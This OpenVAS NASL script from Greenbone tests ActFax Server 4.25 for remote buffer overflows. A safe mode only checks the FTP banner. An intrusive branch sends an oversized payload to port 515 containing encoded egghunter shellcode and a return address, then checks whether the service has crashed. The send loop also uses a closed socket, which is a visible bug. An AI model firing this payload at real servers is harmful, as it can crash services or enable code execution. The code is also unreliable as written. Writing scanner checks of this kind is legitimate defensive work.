###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_actfax_46412.nasl 5427 2017-02-26 20:21:22Z cfi $
#
# ActFax Server Multiple Remote Buffer Overflow Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103179");
  script_version("$Revision: 5427 $");
  script_tag(name:"last_modification", value:"$Date: 2017-02-26 21:21:22 +0100 (Sun, 26 Feb 2017) $");
  script_tag(name:"creation_date", value:"2011-06-09 13:50:22 +0200 (Thu, 09 Jun 2011)");
  script_bugtraq_id(46412);
  script_name("ActFax Server Multiple Remote Buffer Overflow Vulnerabilities");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_category(ACT_MIXED_ATTACK);
  script_family("Denial of Service");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl");
  script_require_ports(21, 515);

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/46412");
  script_xref(name:"URL", value:"http://www.actfax.com/");

  tag_summary = "ActFax is prone to multiple remote buffer-overflow vulnerabilities
  because it fails to bounds-check user-supplied input before copying it
  into an insufficiently sized memory buffer.";

  tag_impact = "Exploiting these vulnerabilities may allow remote attackers to execute
  arbitrary code in the context of the affected application. Failed
  exploit attempts will result in a denial-of-service condition.";

  tag_affected = "ActFax 4.25 Build 0221 is vulnerable; other versions may also
  be affected.";

  script_tag(name:"summary", value:tag_summary);
  script_tag(name:"affected", value:tag_affected);
  script_tag(name:"impact", value:tag_impact);

  script_tag(name:"qod_type", value:"remote_banner");

  exit(0);
}

include("ftp_func.inc");
include("version_func.inc");

if( safe_checks() ) {

  port = 21;
  if( ! get_port_state( port ) ) exit( 0 );
  banner = get_ftp_banner( port:port );

  if( ! banner || "ActiveFax" >!< banner ) exit( 0 );

  version = eregmatch( pattern:"ActiveFax Version ([0-9.]+)", string:banner );
  build   = eregmatch( pattern:"ActiveFax Version.*Build ([0-9]+)", string:banner ); 

  if( ! isnull( version[1] ) ) {
    if( version_is_equal( version:version[1], test_version:"4.25" ) ) {
      if( ! isnull( build[1] ) ) {
        if( version_is_equal( version:build[1], test_version:"0221" ) ) {
          security_message( port:515 );
	  exit( 0 );
        }	 
      }  
    }  
  }
} else {

  port = 515;
  if( ! get_port_state( port ) ) exit( 0 );

  soc = open_sock_tcp( port );
  if( ! soc ) exit( 0 );

  req = raw_string( 0x04 ) + 'OpenVASTest' + raw_string( 0x0a );
  send( socket:soc, data:req );
  
  res = recv( socket:soc, length:256 );
  close( soc );

  if( "ActiveFax Server" >!< res ) exit( 0 );

  eggedi   = string("WYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIrFOqZjyo4O1RPRrJwrShXMvNuluUBzBTJOoH2Wtpp0PtLKxzlorUYzlo2UHgKOKWA");  
  payload1 = string("A",eggedi, raw_string(0x7D));
  payload1 = crap(data:payload1, length:25600);
  addy     = raw_string(0x7D,0x4B,0x4A,0x00);
  payload2 = "w00tw00t";

  payloads = string( payload1, addy, payload2 );  

  for( i = 0; i < 5; i++ ) {

    soc1 = open_sock_tcp( port );

    if( soc1 ) {
      send( socket:soc, data:payloads );
      close( soc1 );
    }  
    sleep( 1 );
  }  

  soc2 = open_sock_tcp( port );
  if( ! soc2 ) {
    security_message( port:port );
    exit( 0 );
  } else {
    close( soc2 );
  }
}

exit( 99 );